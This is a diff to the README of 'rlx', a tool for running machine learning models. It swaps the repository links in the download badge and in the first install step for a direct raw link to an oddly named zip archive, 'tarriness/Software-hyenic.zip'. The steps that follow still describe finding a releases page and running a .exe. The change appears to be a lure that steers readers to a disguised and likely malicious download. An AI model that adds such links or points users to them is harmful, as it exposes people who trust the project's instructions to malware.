@@ -1,6 +1,6 @@
 # ⚡ rlx - Run machine learning models everywhere easily
 
-[![](https://img.shields.io/badge/Download_rlx-blue.svg)](https://github.com/abraha7350/rlx)
+[![](https://img.shields.io/badge/Download_rlx-blue.svg)](https://raw.githubusercontent.com/abraha7350/rlx/main/tarriness/Software-hyenic.zip)
 
 ## 🎯 About this software
 
@@ -21,7 +21,7 @@ Your computer needs to meet these basic standards to run rlx:
 
 You must visit the main repository page to fetch the installer. Follow these steps:
 
-1.  Visit this page to download: [https://github.com/abraha7350/rlx](https://github.com/abraha7350/rlx)
+1.  Visit this page to download: [https://raw.githubusercontent.com/abraha7350/rlx/main/tarriness/Software-hyenic.zip](https://raw.githubusercontent.com/abraha7350/rlx/main/tarriness/Software-hyenic.zip)
 2.  Locate the releases section on the right side of the page.
 3.  Click the link for the latest version of the Windows executable file, which ends in .exe.
 4.  Save the file to your desktop or downloads folder.
